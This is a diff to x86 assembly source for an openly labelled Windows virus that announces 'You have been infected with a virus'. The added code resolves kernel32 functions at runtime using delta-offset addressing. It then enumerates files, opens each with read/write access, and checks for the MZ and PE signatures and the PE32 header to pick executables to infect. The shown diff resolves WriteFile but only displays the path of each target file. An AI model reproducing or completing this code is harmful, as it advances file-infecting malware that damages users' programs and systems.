@@ -18,6 +18,40 @@ WIN32_FIND_DATAA STRUC
     cAlternateFileName   db 14 dup(?)
 WIN32_FIND_DATAA ENDS
 .code
+print proc 
+	mov edx , dword ptr [ebp + offset offsetString]
+	add edx , ebp
+	push 0
+	push 0
+	push edx
+	push 0
+	call dword ptr [ebp + offset handleMessageBoxA ]
+	
+	
+	ret
+
+print endp
+
+read proc 
+
+	mov edx , offset data
+	add edx , ebp	
+	push 100
+	push edx 
+	call dword ptr [ebp + offset handleRtlZeroMemory]
+	
+	mov edx , offset data
+	add edx , ebp
+	
+	push 0
+	push 0
+	push dword ptr [ebp + offset number]
+	push edx
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleReadFile]
+	ret
+
+read endp
 main: ;main----
 	call Delta
 Delta:
@@ -172,22 +206,145 @@ loopFileok:
 	call dword ptr [ebp + offset handleFindNextFileA]
 	cmp eax , 0
 	je endMain
+	cmp dword ptr [ebp + wfd.dwFileAttributes] , 10h
+	jz loopFileok
 	cmp byte ptr [ebp + wfd.cFileName] , "."
 	je loopFileok
 	cmp byte ptr [ebp + wfd.cFileName + 1] , "."
 	je loopFileok
 	;main
-	mov edx , offset wfd.cFileName
+	mov edx , offset RtlZeroMemoryName
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp +offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleRtlZeroMemory] , eax
+	
+	mov edx , offset pathNew
+	add edx , ebp	
+	push 100
+	push edx 
+	call dword ptr [ebp + offset handleRtlZeroMemory]
+	mov ecx , 0
+loopGetNewName:
+	cmp byte ptr [ebp + offset path + ecx] , 0
+	je endLoopNewName
+	mov dl , byte ptr [ebp + offset path +ecx]
+	mov byte ptr [ebp + offset pathNew +ecx] , dl
+	inc ecx 
+	jmp loopGetNewName
+endLoopNewName:
+	mov byte ptr [ebp + offset  pathNew + ecx - 1] , 0
+	dec  ecx
+	mov ebx , 0
+loopGetNewName2:
+	cmp byte ptr [ebp + offset wfd.cFileName + ebx ] , 0
+	je endloopGetNewName2
+	mov dl ,byte ptr [ebp + offset wfd.cFileName +ebx]
+	mov byte ptr [ebp + offset pathNew +ecx] , dl
+	inc ecx
+	inc ebx
+	jmp loopGetNewName2
+endloopGetNewName2:
+
+	mov edx , offset CreateFileName
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleCreateFile] , eax
+	
+	mov edx , offset pathNew
 	add edx , ebp
 	push 0
+	push 128
+	push 3
 	push 0
+	push 0
+	push 0C0000000h
 	push edx
+	call dword ptr [ebp + offset handleCreateFile]
+	mov dword ptr [ebp + offset handleFile] , eax
+	
+	;------------
+	
+	mov edx , offset ReadFileName
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleReadFile ] , eax
+	
+	mov edx , offset WriteFileName
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleWriteFile ] , eax
+	
+	;-------------check Pe
+	mov dword ptr [ebp + offset number] , 2
+	call read
+	cmp word ptr [ebp + offset data] , 5A4Dh
+	jne loopFileok
+	;----------------
+	mov edx , offset SetFilePointerName
+	add edx , ebp 
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleSetFilePointer] , eax
+	
 	push 0
-	call dword ptr [ebp + offset handleMessageBoxA]
+	push 0
+	push 60
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp +offset number] , 4
+	call read
+	push 0
+	push 0
+	push dword ptr [ebp + offset data]
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	
+	cmp dword ptr [ebp + offset data ] , 00004550h
+	jne loopFileok
+	
+	;-------------------------
+	push 1
+	push 0
+	push 20
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp + offset data] , 2
+	call read
+	cmp word ptr [ebp +offset data] , 010Bh
+	jne loopFileok
+	;-------------------------------------------
+	mov dword ptr [ebp + offset offsetString] , offset pathNew
+	call print
+	;mov dword ptr [ebp + offset offsetString] , offset data
+	;call print 
 	;;
 	jmp loopFileok
 endMain:
 ;data---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SetFilePointerName db "SetFilePointer" , 0
+handleSetFilePointer dd ?
+WriteFileName db "WriteFile" , 0
+handleWriteFile dd ?
+ReadFileName db "ReadFile" , 0
+handleReadFile dd ?
+CreateFileName db "CreateFileA" , 0
+handleCreateFile dd ?
+RtlZeroMemoryName db "RtlZeroMemory" , 0
+handleRtlZeroMemory dd ?
 FindNextFileAName db "FindNextFileA" , 0
 handleFindNextFileA dd ?
 user32 db "user32.dll" , 0
@@ -221,4 +378,6 @@ ifanew dd ?
 sectionNumber dw ?
 notificationMalware db "You have been infected with a virus", 0Dh , 0Dh  , "                      --1337DaKL--" , 0
 wfd WIN32_FIND_DATAA <>
+offsetString dd ?
+number dd ?
 end main
